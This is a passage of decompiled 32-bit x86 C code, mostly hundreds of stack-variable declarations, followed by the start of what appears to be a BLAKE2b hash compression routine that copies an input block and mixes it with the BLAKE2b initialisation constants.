  int v672; // [esp+23Ch] [ebp-1080h]
  int v673; // [esp+248h] [ebp-1074h]
  int v674; // [esp+250h] [ebp-106Ch]
  int v675; // [esp+258h] [ebp-1064h]
  int v676; // [esp+25Ch] [ebp-1060h]
  int v677; // [esp+264h] [ebp-1058h]
  int v678; // [esp+26Ch] [ebp-1050h]
  int v679; // [esp+274h] [ebp-1048h]
  int v680; // [esp+280h] [ebp-103Ch]
  unsigned int v681; // [esp+288h] [ebp-1034h]
  int v682; // [esp+28Ch] [ebp-1030h]
  int v683; // [esp+294h] [ebp-1028h]
  int v684; // [esp+29Ch] [ebp-1020h]
  unsigned int v685; // [esp+2A8h] [ebp-1014h]
  int v686; // [esp+2B0h] [ebp-100Ch]
  int v687; // [esp+2B8h] [ebp-1004h]
  int v688; // [esp+2BCh] [ebp-1000h]
  int v689; // [esp+2C4h] [ebp-FF8h]
  int v690; // [esp+2CCh] [ebp-FF0h]
  int v691; // [esp+2D4h] [ebp-FE8h]
  int v692; // [esp+2E0h] [ebp-FDCh]
  unsigned int v693; // [esp+2E8h] [ebp-FD4h]
  int v694; // [esp+2ECh] [ebp-FD0h]
  int v695; // [esp+2F4h] [ebp-FC8h]
  int v696; // [esp+2FCh] [ebp-FC0h]
  unsigned int v697; // [esp+308h] [ebp-FB4h]
  int v698; // [esp+310h] [ebp-FACh]
  int v699; // [esp+318h] [ebp-FA4h]
  int v700; // [esp+31Ch] [ebp-FA0h]
  int v701; // [esp+324h] [ebp-F98h]
  int v702; // [esp+32Ch] [ebp-F90h]
  int v703; // [esp+334h] [ebp-F88h]
  int v704; // [esp+340h] [ebp-F7Ch]
  int v705; // [esp+348h] [ebp-F74h]
  int v706; // [esp+34Ch] [ebp-F70h]
  int v707; // [esp+354h] [ebp-F68h]
  int v708; // [esp+35Ch] [ebp-F60h]
  unsigned int v709; // [esp+368h] [ebp-F54h]
  int v710; // [esp+370h] [ebp-F4Ch]
  int v711; // [esp+378h] [ebp-F44h]
  int v712; // [esp+37Ch] [ebp-F40h]
  int v713; // [esp+384h] [ebp-F38h]
  int v714; // [esp+38Ch] [ebp-F30h]
  int v715; // [esp+394h] [ebp-F28h]
  int v716; // [esp+3A0h] [ebp-F1Ch]
  unsigned int v717; // [esp+3A8h] [ebp-F14h]
  int v718; // [esp+3ACh] [ebp-F10h]
  int v719; // [esp+3B4h] [ebp-F08h]
  int v720; // [esp+3BCh] [ebp-F00h]
  unsigned int v721; // [esp+3C8h] [ebp-EF4h]
  int v722; // [esp+3D0h] [ebp-EECh]
  int v723; // [esp+3D8h] [ebp-EE4h]
  int v724; // [esp+3DCh] [ebp-EE0h]
  int v725; // [esp+3E4h] [ebp-ED8h]
  int v726; // [esp+3ECh] [ebp-ED0h]
  int v727; // [esp+3F4h] [ebp-EC8h]
  int v728; // [esp+400h] [ebp-EBCh]
  int v729; // [esp+408h] [ebp-EB4h]
  int v730; // [esp+40Ch] [ebp-EB0h]
  int v731; // [esp+414h] [ebp-EA8h]
  unsigned int v732; // [esp+41Ch] [ebp-EA0h]
  int v733; // [esp+428h] [ebp-E94h]
  int v734; // [esp+430h] [ebp-E8Ch]
  int v735; // [esp+438h] [ebp-E84h]
  int v736; // [esp+43Ch] [ebp-E80h]
  int v737; // [esp+444h] [ebp-E78h]
  int v738; // [esp+44Ch] [ebp-E70h]
  int v739; // [esp+454h] [ebp-E68h]
  int v740; // [esp+460h] [ebp-E5Ch]
  unsigned int v741; // [esp+468h] [ebp-E54h]
  int v742; // [esp+46Ch] [ebp-E50h]
  int v743; // [esp+474h] [ebp-E48h]
  int v744; // [esp+47Ch] [ebp-E40h]
  int v745; // [esp+488h] [ebp-E34h]
  int v746; // [esp+490h] [ebp-E2Ch]
  int v747; // [esp+498h] [ebp-E24h]
  int v748; // [esp+49Ch] [ebp-E20h]
  int v749; // [esp+4A4h] [ebp-E18h]
  int v750; // [esp+4ACh] [ebp-E10h]
  int v751; // [esp+4B4h] [ebp-E08h]
  int v752; // [esp+4C0h] [ebp-DFCh]
  unsigned int v753; // [esp+4C8h] [ebp-DF4h]
  int v754; // [esp+4CCh] [ebp-DF0h]
  int v755; // [esp+4D4h] [ebp-DE8h]
  int v756; // [esp+4DCh] [ebp-DE0h]
  int v757; // [esp+4E8h] [ebp-DD4h]
  int v758; // [esp+4F0h] [ebp-DCCh]
  int v759; // [esp+4F8h] [ebp-DC4h]
  int v760; // [esp+4FCh] [ebp-DC0h]
  int v761; // [esp+504h] [ebp-DB8h]
  int v762; // [esp+50Ch] [ebp-DB0h]
  int v763; // [esp+514h] [ebp-DA8h]
  int v764; // [esp+520h] [ebp-D9Ch]
  unsigned int v765; // [esp+528h] [ebp-D94h]
  int v766; // [esp+52Ch] [ebp-D90h]
  int v767; // [esp+534h] [ebp-D88h]
  int v768; // [esp+53Ch] [ebp-D80h]
  unsigned int v769; // [esp+548h] [ebp-D74h]
  int v770; // [esp+550h] [ebp-D6Ch]
  int v771; // [esp+558h] [ebp-D64h]
  int v772; // [esp+55Ch] [ebp-D60h]
  int v773; // [esp+564h] [ebp-D58h]
  int v774; // [esp+56Ch] [ebp-D50h]
  int v775; // [esp+574h] [ebp-D48h]
  int v776; // [esp+580h] [ebp-D3Ch]
  int v777; // [esp+588h] [ebp-D34h]
  int v778; // [esp+58Ch] [ebp-D30h]
  int v779; // [esp+594h] [ebp-D28h]
  unsigned int v780; // [esp+59Ch] [ebp-D20h]
  int v781; // [esp+5A8h] [ebp-D14h]
  int v782; // [esp+5B0h] [ebp-D0Ch]
  int v783; // [esp+5B8h] [ebp-D04h]
  int v784; // [esp+5BCh] [ebp-D00h]
  int v785; // [esp+5C4h] [ebp-CF8h]
  int v786; // [esp+5CCh] [ebp-CF0h]
  int v787; // [esp+5D4h] [ebp-CE8h]
  int v788; // [esp+5E0h] [ebp-CDCh]
  unsigned int v789; // [esp+5E8h] [ebp-CD4h]
  int v790; // [esp+5ECh] [ebp-CD0h]
  int v791; // [esp+5F4h] [ebp-CC8h]
  int v792; // [esp+5FCh] [ebp-CC0h]
  unsigned int v793; // [esp+608h] [ebp-CB4h]
  int v794; // [esp+610h] [ebp-CACh]
  int v795; // [esp+618h] [ebp-CA4h]
  int v796; // [esp+61Ch] [ebp-CA0h]
  int v797; // [esp+624h] [ebp-C98h]
  int v798; // [esp+62Ch] [ebp-C90h]
  int v799; // [esp+634h] [ebp-C88h]
  int v800; // [esp+640h] [ebp-C7Ch]
  int v801; // [esp+648h] [ebp-C74h]
  int v802; // [esp+64Ch] [ebp-C70h]
  int v803; // [esp+654h] [ebp-C68h]
  int v804; // [esp+65Ch] [ebp-C60h]
  int v805; // [esp+668h] [ebp-C54h]
  int v806; // [esp+670h] [ebp-C4Ch]
  int v807; // [esp+678h] [ebp-C44h]
  int v808; // [esp+67Ch] [ebp-C40h]
  int v809; // [esp+684h] [ebp-C38h]
  int v810; // [esp+68Ch] [ebp-C30h]
  int v811; // [esp+694h] [ebp-C28h]
  int v812; // [esp+6A0h] [ebp-C1Ch]
  unsigned int v813; // [esp+6A8h] [ebp-C14h]
  int v814; // [esp+6ACh] [ebp-C10h]
  int v815; // [esp+6B4h] [ebp-C08h]
  int v816; // [esp+6BCh] [ebp-C00h]
  unsigned int v817; // [esp+6C8h] [ebp-BF4h]
  int v818; // [esp+6D0h] [ebp-BECh]
  int v819; // [esp+6D8h] [ebp-BE4h]
  int v820; // [esp+6DCh] [ebp-BE0h]
  int v821; // [esp+6E4h] [ebp-BD8h]
  int v822; // [esp+6ECh] [ebp-BD0h]
  int v823; // [esp+6F4h] [ebp-BC8h]
  int v824; // [esp+700h] [ebp-BBCh]
  int v825; // [esp+708h] [ebp-BB4h]
  int v826; // [esp+70Ch] [ebp-BB0h]
  int v827; // [esp+714h] [ebp-BA8h]
  int v828; // [esp+71Ch] [ebp-BA0h]
  int v829; // [esp+728h] [ebp-B94h]
  int v830; // [esp+730h] [ebp-B8Ch]
  int v831; // [esp+738h] [ebp-B84h]
  int v832; // [esp+73Ch] [ebp-B80h]
  int v833; // [esp+744h] [ebp-B78h]
  int v834; // [esp+74Ch] [ebp-B70h]
  int v835; // [esp+754h] [ebp-B68h]
  int v836; // [esp+760h] [ebp-B5Ch]
  unsigned int v837; // [esp+768h] [ebp-B54h]
  int v838; // [esp+76Ch] [ebp-B50h]
  int v839; // [esp+774h] [ebp-B48h]
  int v840; // [esp+77Ch] [ebp-B40h]
  unsigned int v841; // [esp+788h] [ebp-B34h]
  int v842; // [esp+790h] [ebp-B2Ch]
  int v843; // [esp+798h] [ebp-B24h]
  int v844; // [esp+79Ch] [ebp-B20h]
  int v845; // [esp+7A4h] [ebp-B18h]
  int v846; // [esp+7ACh] [ebp-B10h]
  int v847; // [esp+7B4h] [ebp-B08h]
  int v848; // [esp+7C0h] [ebp-AFCh]
  unsigned int v849; // [esp+7C8h] [ebp-AF4h]
  int v850; // [esp+7CCh] [ebp-AF0h]
  int v851; // [esp+7D4h] [ebp-AE8h]
  int v852; // [esp+7DCh] [ebp-AE0h]
  unsigned int v853; // [esp+7E8h] [ebp-AD4h]
  int v854; // [esp+7F0h] [ebp-ACCh]
  int v855; // [esp+7F8h] [ebp-AC4h]
  int v856; // [esp+7FCh] [ebp-AC0h]
  int v857; // [esp+804h] [ebp-AB8h]
  int v858; // [esp+80Ch] [ebp-AB0h]
  int v859; // [esp+814h] [ebp-AA8h]
  int v860; // [esp+820h] [ebp-A9Ch]
  unsigned int v861; // [esp+828h] [ebp-A94h]
  int v862; // [esp+82Ch] [ebp-A90h]
  int v863; // [esp+834h] [ebp-A88h]
  int v864; // [esp+83Ch] [ebp-A80h]
  unsigned int v865; // [esp+848h] [ebp-A74h]
  int v866; // [esp+850h] [ebp-A6Ch]
  int v867; // [esp+858h] [ebp-A64h]
  int v868; // [esp+85Ch] [ebp-A60h]
  int v869; // [esp+864h] [ebp-A58h]
  int v870; // [esp+86Ch] [ebp-A50h]
  int v871; // [esp+874h] [ebp-A48h]
  int v872; // [esp+880h] [ebp-A3Ch]
  int v873; // [esp+888h] [ebp-A34h]
  int v874; // [esp+88Ch] [ebp-A30h]
  int v875; // [esp+894h] [ebp-A28h]
  int v876; // [esp+89Ch] [ebp-A20h]
  int v877; // [esp+8A8h] [ebp-A14h]
  int v878; // [esp+8B0h] [ebp-A0Ch]
  int v879; // [esp+8B8h] [ebp-A04h]
  int v880; // [esp+8BCh] [ebp-A00h]
  int v881; // [esp+8C4h] [ebp-9F8h]
  int v882; // [esp+8CCh] [ebp-9F0h]
  int v883; // [esp+8D4h] [ebp-9E8h]
  int v884; // [esp+8E0h] [ebp-9DCh]
  unsigned int v885; // [esp+8E8h] [ebp-9D4h]
  int v886; // [esp+8ECh] [ebp-9D0h]
  int v887; // [esp+8F4h] [ebp-9C8h]
  int v888; // [esp+8FCh] [ebp-9C0h]
  unsigned int v889; // [esp+908h] [ebp-9B4h]
  int v890; // [esp+910h] [ebp-9ACh]
  int v891; // [esp+918h] [ebp-9A4h]
  int v892; // [esp+91Ch] [ebp-9A0h]
  int v893; // [esp+924h] [ebp-998h]
  int v894; // [esp+92Ch] [ebp-990h]
  int v895; // [esp+934h] [ebp-988h]
  int v896; // [esp+940h] [ebp-97Ch]
  int v897; // [esp+948h] [ebp-974h]
  int v898; // [esp+94Ch] [ebp-970h]
  int v899; // [esp+954h] [ebp-968h]
  int v900; // [esp+95Ch] [ebp-960h]
  int v901; // [esp+968h] [ebp-954h]
  int v902; // [esp+970h] [ebp-94Ch]
  int v903; // [esp+978h] [ebp-944h]
  int v904; // [esp+97Ch] [ebp-940h]
  int v905; // [esp+984h] [ebp-938h]
  int v906; // [esp+98Ch] [ebp-930h]
  int v907; // [esp+994h] [ebp-928h]
  int v908; // [esp+9A0h] [ebp-91Ch]
  unsigned int v909; // [esp+9A8h] [ebp-914h]
  int v910; // [esp+9ACh] [ebp-910h]
  int v911; // [esp+9B4h] [ebp-908h]
  int v912; // [esp+9BCh] [ebp-900h]
  unsigned int v913; // [esp+9C8h] [ebp-8F4h]
  int v914; // [esp+9D0h] [ebp-8ECh]
  int v915; // [esp+9D8h] [ebp-8E4h]
  int v916; // [esp+9DCh] [ebp-8E0h]
  int v917; // [esp+9E4h] [ebp-8D8h]
  int v918; // [esp+9ECh] [ebp-8D0h]
  int v919; // [esp+9F4h] [ebp-8C8h]
  int v920; // [esp+A00h] [ebp-8BCh]
  int v921; // [esp+A08h] [ebp-8B4h]
  int v922; // [esp+A0Ch] [ebp-8B0h]
  int v923; // [esp+A14h] [ebp-8A8h]
  int v924; // [esp+A1Ch] [ebp-8A0h]
  int v925; // [esp+A28h] [ebp-894h]
  int v926; // [esp+A30h] [ebp-88Ch]
  int v927; // [esp+A38h] [ebp-884h]
  unsigned int v928; // [esp+A3Ch] [ebp-880h]
  int v929; // [esp+A44h] [ebp-878h]
  int v930; // [esp+A50h] [ebp-86Ch]
  int v931; // [esp+A54h] [ebp-868h]
  int v932; // [esp+A60h] [ebp-85Ch]
  unsigned int v933; // [esp+A68h] [ebp-854h]
  int v934; // [esp+A6Ch] [ebp-850h]
  unsigned int v935; // [esp+A74h] [ebp-848h]
  unsigned int v936; // [esp+A80h] [ebp-83Ch]
  unsigned int v937; // [esp+A88h] [ebp-834h]
  int v938; // [esp+A90h] [ebp-82Ch]
  int v939; // [esp+A98h] [ebp-824h]
  int v940; // [esp+A9Ch] [ebp-820h]
  int v941; // [esp+AA4h] [ebp-818h]
  int v942; // [esp+AB0h] [ebp-80Ch]
  int v943; // [esp+AB4h] [ebp-808h]
  unsigned int v944; // [esp+AC0h] [ebp-7FCh]
  unsigned int v945; // [esp+AC8h] [ebp-7F4h]
  int v946; // [esp+ACCh] [ebp-7F0h]
  int v947; // [esp+AD4h] [ebp-7E8h]
  unsigned int v948; // [esp+AE0h] [ebp-7DCh]
  unsigned int v949; // [esp+AE8h] [ebp-7D4h]
  unsigned int v950; // [esp+AF0h] [ebp-7CCh]
  int v951; // [esp+AF8h] [ebp-7C4h]
  int v952; // [esp+AFCh] [ebp-7C0h]
  int v953; // [esp+B04h] [ebp-7B8h]
  unsigned int v954; // [esp+B10h] [ebp-7ACh]
  int v955; // [esp+B14h] [ebp-7A8h]
  int v956; // [esp+B20h] [ebp-79Ch]
  unsigned int v957; // [esp+B28h] [ebp-794h]
  int v958; // [esp+B2Ch] [ebp-790h]
  int v959; // [esp+B34h] [ebp-788h]
  unsigned int v960; // [esp+B40h] [ebp-77Ch]
  unsigned int v961; // [esp+B48h] [ebp-774h]
  int v962; // [esp+B50h] [ebp-76Ch]
  int v963; // [esp+B58h] [ebp-764h]
  int v964; // [esp+B5Ch] [ebp-760h]
  int v965; // [esp+B64h] [ebp-758h]
  unsigned int v966; // [esp+B70h] [ebp-74Ch]
  int v967; // [esp+B74h] [ebp-748h]
  unsigned int v968; // [esp+B80h] [ebp-73Ch]
  unsigned int v969; // [esp+B88h] [ebp-734h]
  int v970; // [esp+B8Ch] [ebp-730h]
  int v971; // [esp+B94h] [ebp-728h]
  unsigned int v972; // [esp+BA0h] [ebp-71Ch]
  unsigned int v973; // [esp+BA8h] [ebp-714h]
  unsigned int v974; // [esp+BB0h] [ebp-70Ch]
  int v975; // [esp+BB8h] [ebp-704h]
  int v976; // [esp+BBCh] [ebp-700h]
  int v977; // [esp+BC4h] [ebp-6F8h]
  int v978; // [esp+BD0h] [ebp-6ECh]
  int v979; // [esp+BD4h] [ebp-6E8h]
  int v980; // [esp+BE0h] [ebp-6DCh]
  unsigned int v981; // [esp+BE8h] [ebp-6D4h]
  int v982; // [esp+BECh] [ebp-6D0h]
  int v983; // [esp+BF4h] [ebp-6C8h]
  unsigned int v984; // [esp+C00h] [ebp-6BCh]
  unsigned int v985; // [esp+C08h] [ebp-6B4h]
  int v986; // [esp+C10h] [ebp-6ACh]
  int v987; // [esp+C18h] [ebp-6A4h]
  int v988; // [esp+C1Ch] [ebp-6A0h]
  int v989; // [esp+C24h] [ebp-698h]
  unsigned int v990; // [esp+C30h] [ebp-68Ch]
  int v991; // [esp+C34h] [ebp-688h]
  unsigned int v992; // [esp+C40h] [ebp-67Ch]
  int v993; // [esp+C48h] [ebp-674h]
  int v994; // [esp+C4Ch] [ebp-670h]
  int v995; // [esp+C54h] [ebp-668h]
  unsigned int v996; // [esp+C60h] [ebp-65Ch]
  int v997; // [esp+C68h] [ebp-654h]
  unsigned int v998; // [esp+C70h] [ebp-64Ch]
  int v999; // [esp+C78h] [ebp-644h]
  int v1000; // [esp+C7Ch] [ebp-640h]
  int v1001; // [esp+C84h] [ebp-638h]
  int v1002; // [esp+C90h] [ebp-62Ch]
  int v1003; // [esp+C94h] [ebp-628h]
  unsigned int v1004; // [esp+CA0h] [ebp-61Ch]
  int v1005; // [esp+CA8h] [ebp-614h]
  int v1006; // [esp+CACh] [ebp-610h]
  int v1007; // [esp+CB4h] [ebp-608h]
  int v1008; // [esp+CC0h] [ebp-5FCh]
  int v1009; // [esp+CC8h] [ebp-5F4h]
  int v1010; // [esp+CD0h] [ebp-5ECh]
  int v1011; // [esp+CD8h] [ebp-5E4h]
  int v1012; // [esp+CDCh] [ebp-5E0h]
  int v1013; // [esp+CE4h] [ebp-5D8h]
  unsigned int v1014; // [esp+CF0h] [ebp-5CCh]
  int v1015; // [esp+CF4h] [ebp-5C8h]
  unsigned int v1016; // [esp+D00h] [ebp-5BCh]
  int v1017; // [esp+D08h] [ebp-5B4h]
  int v1018; // [esp+D0Ch] [ebp-5B0h]
  int v1019; // [esp+D14h] [ebp-5A8h]
  unsigned int v1020; // [esp+D20h] [ebp-59Ch]
  int v1021; // [esp+D28h] [ebp-594h]
  unsigned int v1022; // [esp+D30h] [ebp-58Ch]
  int v1023; // [esp+D38h] [ebp-584h]
  int v1024; // [esp+D3Ch] [ebp-580h]
  int v1025; // [esp+D44h] [ebp-578h]
  unsigned int v1026; // [esp+D50h] [ebp-56Ch]
  int v1027; // [esp+D54h] [ebp-568h]
  unsigned int v1028; // [esp+D60h] [ebp-55Ch]
  unsigned int v1029; // [esp+D68h] [ebp-554h]
  int v1030; // [esp+D6Ch] [ebp-550h]
  int v1031; // [esp+D74h] [ebp-548h]
  unsigned int v1032; // [esp+D80h] [ebp-53Ch]
  unsigned int v1033; // [esp+D88h] [ebp-534h]
  int v1034; // [esp+D90h] [ebp-52Ch]
  int v1035; // [esp+D98h] [ebp-524h]
  int v1036; // [esp+D9Ch] [ebp-520h]
  int v1037; // [esp+DA4h] [ebp-518h]
  unsigned int v1038; // [esp+DB0h] [ebp-50Ch]
  int v1039; // [esp+DB4h] [ebp-508h]
  unsigned int v1040; // [esp+DC0h] [ebp-4FCh]
  unsigned int v1041; // [esp+DC8h] [ebp-4F4h]
  int v1042; // [esp+DCCh] [ebp-4F0h]
  int v1043; // [esp+DD4h] [ebp-4E8h]
  unsigned int v1044; // [esp+DE0h] [ebp-4DCh]
  unsigned int v1045; // [esp+DE8h] [ebp-4D4h]
  unsigned int v1046; // [esp+DF0h] [ebp-4CCh]
  int v1047; // [esp+DF8h] [ebp-4C4h]
  int v1048; // [esp+DFCh] [ebp-4C0h]
  int v1049; // [esp+E04h] [ebp-4B8h]
  unsigned int v1050; // [esp+E10h] [ebp-4ACh]
  int v1051; // [esp+E14h] [ebp-4A8h]
  int v1052; // [esp+E20h] [ebp-49Ch]
  unsigned int v1053; // [esp+E28h] [ebp-494h]
  int v1054; // [esp+E2Ch] [ebp-490h]
  int v1055; // [esp+E34h] [ebp-488h]
  unsigned int v1056; // [esp+E40h] [ebp-47Ch]
  unsigned int v1057; // [esp+E48h] [ebp-474h]
  unsigned int v1058; // [esp+E50h] [ebp-46Ch]
  int v1059; // [esp+E58h] [ebp-464h]
  int v1060; // [esp+E5Ch] [ebp-460h]
  int v1061; // [esp+E64h] [ebp-458h]
  int v1062; // [esp+E70h] [ebp-44Ch]
  int v1063; // [esp+E74h] [ebp-448h]
  int v1064; // [esp+E80h] [ebp-43Ch]
  unsigned int v1065; // [esp+E88h] [ebp-434h]
  unsigned int v1066; // [esp+E90h] [ebp-42Ch]
  int v1067; // [esp+E94h] [ebp-428h]
  int v1068; // [esp+E9Ch] [ebp-420h]
  unsigned int v1069; // [esp+EA8h] [ebp-414h]
  unsigned int v1070; // [esp+EB0h] [ebp-40Ch]
  int v1071; // [esp+EB8h] [ebp-404h]
  int v1072; // [esp+EC0h] [ebp-3FCh]
  int v1073; // [esp+EC4h] [ebp-3F8h]
  int v1074; // [esp+ECCh] [ebp-3F0h]
  int v1075; // [esp+ED4h] [ebp-3E8h]
  unsigned int v1076; // [esp+EE0h] [ebp-3DCh]
  unsigned int v1077; // [esp+EE8h] [ebp-3D4h]
  int v1078; // [esp+EF0h] [ebp-3CCh]
  int v1079; // [esp+EF4h] [ebp-3C8h]
  int v1080; // [esp+EFCh] [ebp-3C0h]
  unsigned int v1081; // [esp+F08h] [ebp-3B4h]
  unsigned int v1082; // [esp+F10h] [ebp-3ACh]
  int v1083; // [esp+F18h] [ebp-3A4h]
  unsigned int v1084; // [esp+F20h] [ebp-39Ch]
  int v1085; // [esp+F24h] [ebp-398h]
  int v1086; // [esp+F2Ch] [ebp-390h]
  int v1087; // [esp+F34h] [ebp-388h]
  int v1088; // [esp+F40h] [ebp-37Ch]
  unsigned int v1089; // [esp+F48h] [ebp-374h]
  int v1090; // [esp+F50h] [ebp-36Ch]
  int v1091; // [esp+F54h] [ebp-368h]
  int v1092; // [esp+F5Ch] [ebp-360h]
  int v1093; // [esp+F68h] [ebp-354h]
  unsigned int v1094; // [esp+F70h] [ebp-34Ch]
  int v1095; // [esp+F78h] [ebp-344h]
  int v1096; // [esp+F80h] [ebp-33Ch]
  int v1097; // [esp+F84h] [ebp-338h]
  int v1098; // [esp+F8Ch] [ebp-330h]
  int v1099; // [esp+F94h] [ebp-328h]
  unsigned int v1100; // [esp+FA0h] [ebp-31Ch]
  int v1101; // [esp+FA8h] [ebp-314h]
  unsigned int v1102; // [esp+FB0h] [ebp-30Ch]
  int v1103; // [esp+FB4h] [ebp-308h]
  int v1104; // [esp+FBCh] [ebp-300h]
  int v1105; // [esp+FC8h] [ebp-2F4h]
  unsigned int v1106; // [esp+FD0h] [ebp-2ECh]
  int v1107; // [esp+FD8h] [ebp-2E4h]
  unsigned int v1108; // [esp+FE0h] [ebp-2DCh]
  int v1109; // [esp+FE4h] [ebp-2D8h]
  int v1110; // [esp+FECh] [ebp-2D0h]
  int v1111; // [esp+FF4h] [ebp-2C8h]
  unsigned int v1112; // [esp+1000h] [ebp-2BCh]
  int v1113; // [esp+1008h] [ebp-2B4h]
  int v1114; // [esp+1010h] [ebp-2ACh]
  int v1115; // [esp+1014h] [ebp-2A8h]
  int v1116; // [esp+101Ch] [ebp-2A0h]
  int v1117; // [esp+1028h] [ebp-294h]
  unsigned int v1118; // [esp+1030h] [ebp-28Ch]
  int v1119; // [esp+1038h] [ebp-284h]
  unsigned int v1120; // [esp+1040h] [ebp-27Ch]
  int v1121; // [esp+1044h] [ebp-278h]
  int v1122; // [esp+104Ch] [ebp-270h]
  int v1123; // [esp+1054h] [ebp-268h]
  unsigned int v1124; // [esp+1060h] [ebp-25Ch]
  unsigned int v1125; // [esp+1068h] [ebp-254h]
  int v1126; // [esp+1070h] [ebp-24Ch]
  int v1127; // [esp+1074h] [ebp-248h]
  unsigned int v1128; // [esp+107Ch] [ebp-240h]
  unsigned int v1129; // [esp+1088h] [ebp-234h]
  unsigned int v1130; // [esp+1090h] [ebp-22Ch]
  int v1131; // [esp+1098h] [ebp-224h]
  int v1132; // [esp+109Ch] [ebp-220h]
  int v1133; // [esp+10A4h] [ebp-218h]
  int v1134; // [esp+10B0h] [ebp-20Ch]
  int v1135; // [esp+10B4h] [ebp-208h]
  unsigned int v1136; // [esp+10C0h] [ebp-1FCh]
  unsigned int v1137; // [esp+10C8h] [ebp-1F4h]
  int v1138; // [esp+10CCh] [ebp-1F0h]
  int v1139; // [esp+10D4h] [ebp-1E8h]
  unsigned int v1140; // [esp+10E0h] [ebp-1DCh]
  unsigned int v1141; // [esp+10E8h] [ebp-1D4h]
  unsigned int v1142; // [esp+10F0h] [ebp-1CCh]
  int v1143; // [esp+10F8h] [ebp-1C4h]
  int v1144; // [esp+10FCh] [ebp-1C0h]
  int v1145; // [esp+1108h] [ebp-1B4h]
  int v1146; // [esp+1110h] [ebp-1ACh]
  int v1147; // [esp+1114h] [ebp-1A8h]
  unsigned int v1148; // [esp+1120h] [ebp-19Ch]
  int v1149; // [esp+1124h] [ebp-198h]
  int v1150; // [esp+112Ch] [ebp-190h]
  unsigned int v1151; // [esp+1138h] [ebp-184h]
  int v1152; // [esp+1140h] [ebp-17Ch]
  int v1153; // [esp+1148h] [ebp-174h]
  unsigned int v1154; // [esp+1150h] [ebp-16Ch]
  int v1155; // [esp+1154h] [ebp-168h]
  int v1156; // [esp+115Ch] [ebp-160h]
  int v1157; // [esp+1164h] [ebp-158h]
  int v1158; // [esp+1170h] [ebp-14Ch]
  unsigned int v1159; // [esp+1178h] [ebp-144h]
  unsigned int v1160; // [esp+1180h] [ebp-13Ch]
  int v1161; // [esp+1188h] [ebp-134h]
  int v1162; // [esp+118Ch] [ebp-130h]
  int v1163; // [esp+1194h] [ebp-128h]
  int v1164; // [esp+11A0h] [ebp-11Ch]
  int v1165; // [esp+11A4h] [ebp-118h]
  unsigned int v1166; // [esp+11B0h] [ebp-10Ch]
  unsigned int v1167; // [esp+11B8h] [ebp-104h]
  int v1168; // [esp+11C0h] [ebp-FCh]
  int v1169; // [esp+11C8h] [ebp-F4h]
  int v1170; // [esp+11CCh] [ebp-F0h]
  unsigned int v1171; // [esp+11D4h] [ebp-E8h]
  unsigned int v1172; // [esp+11E0h] [ebp-DCh]
  int v1173; // [esp+11E4h] [ebp-D8h]
  unsigned int v1174; // [esp+11F0h] [ebp-CCh]
  unsigned int v1175; // [esp+11F8h] [ebp-C4h]
  int v1176; // [esp+11FCh] [ebp-C0h]
  int v1177; // [esp+1204h] [ebp-B8h]
  unsigned int v1178; // [esp+1210h] [ebp-ACh]
  unsigned int v1179; // [esp+1218h] [ebp-A4h]
  unsigned int v1180; // [esp+1220h] [ebp-9Ch]
  int v1181; // [esp+1228h] [ebp-94h]
  int v1182; // [esp+122Ch] [ebp-90h]
  int v1183; // [esp+1234h] [ebp-88h]
  unsigned int v1184; // [esp+1240h] [ebp-7Ch]
  int v1185; // [esp+1244h] [ebp-78h]
  int v1186; // [esp+124Ch] [ebp-70h]
  unsigned int v1187; // [esp+1258h] [ebp-64h]
  unsigned int v1188; // [esp+1260h] [ebp-5Ch]
  int v1189; // [esp+1268h] [ebp-54h]
  unsigned int v1190; // [esp+1270h] [ebp-4Ch]
  int v1191; // [esp+1274h] [ebp-48h]
  int v1192; // [esp+1280h] [ebp-3Ch]
  int v1193; // [esp+1284h] [ebp-38h]
  int v1194; // [esp+128Ch] [ebp-30h]
  unsigned int v1195; // [esp+1294h] [ebp-28h]
  unsigned int v1196; // [esp+12A0h] [ebp-1Ch]
  int v1197; // [esp+12A4h] [ebp-18h]
  int v1198; // [esp+12ACh] [ebp-10h]
  unsigned int v1199; // [esp+12B8h] [ebp-4h]

  result = a1;
  v4 = a2;
  v622 = a3;
  if ( a3 >= 0x80 )
    v622 = 128;
  HIDWORD(v590) = a1[1];
  v591 = *((_QWORD *)a1 + 1);
  LODWORD(v592) = a1[4];
  v5 = *a1;
  v6 = a1[8];
  v7 = a1[9];
  HIDWORD(v592) = a1[5];
  v593 = *((_QWORD *)a1 + 3);
  v595 = *((_QWORD *)a1 + 5);
  v596 = *((_QWORD *)a1 + 6);
  v597 = *((_QWORD *)a1 + 7);
  while ( 1 )
  {
    v8 = (_DWORD *)(v4 + 16);
    v9 = -v4;
    v651 = (int)&v606 + v9;
    v10 = &v607;
    v636 = &v607;
    v589 = (char *)&v607 + v9;
    v623 = 4;
    do
    {
      *((_DWORD *)v10 - 2) = *(v8 - 4);
      *((_DWORD *)v10 - 1) = *(v8 - 3);
      *(_DWORD *)v10 = *(v8 - 2);
      *((_DWORD *)v10 + 1) = *(v8 - 1);
      v11 = v651;
      *(_DWORD *)((char *)v8 + v651) = *v8;
      *(_DWORD *)((char *)v8 + v11 + 4) = v8[1];
      *(_DWORD *)((char *)v8 + (_DWORD)v589) = v8[2];
      *(_DWORD *)((char *)v8 + (_DWORD)v589 + 4) = v8[3];
      v10 = v636 + 4;
      v8 += 8;
      v12 = v623-- == 1;
      v636 += 4;
    }
    while ( !v12 );
    v13 = __CFADD__(v622, result[16]);
    result[16] += v622;
    v14 = result[16];
    result[17] += v13;
    v15 = result[17];
    v652 = __PAIR64__(v15, v14) < v622;
    v13 = __CFADD__(v652, result[18]);
    result[18] += v652;
    result[19] += v13;
    HIDWORD(v602) = v15 ^ 0x510E527F;
    v603 = *((_QWORD *)result + 9) ^ 0x9B05688C2B3E6C1Fui64;
    v604 = *((_QWORD *)result + 10) ^ 0x1F83D9ABFB41BD6Bi64;
    v605 = *((_QWORD *)result + 11) ^ 0x5BE0CD19137E2179i64;
    v16 = (__PAIR64__(v7, v6) + v606 + __PAIR64__(HIDWORD(v590), v5)) >> 32;
    v17 = v6 + v606 + v5;
    HIDWORD(v590) = v16;
    LODWORD(v602) = v15 ^ 0x510E527F ^ v16;
    LODWORD(v18) = v602 - 205731576;
    HIDWORD(v602) = v14 ^ 0xADE682D1 ^ v17;
    v19 = __CFADD__((_DWORD)v602, -205731576) + HIDWORD(v602) + 1779033703;
    LODWORD(v20) = (v602 - 205731576) ^ v6;
    HIDWORD(v20) = v19 ^ v7;
    LODWORD(v21) = v20 >> 24;
    HIDWORD(v21) = ((v19 ^ v7) >> 24) | ((_DWORD)v20 << 8);
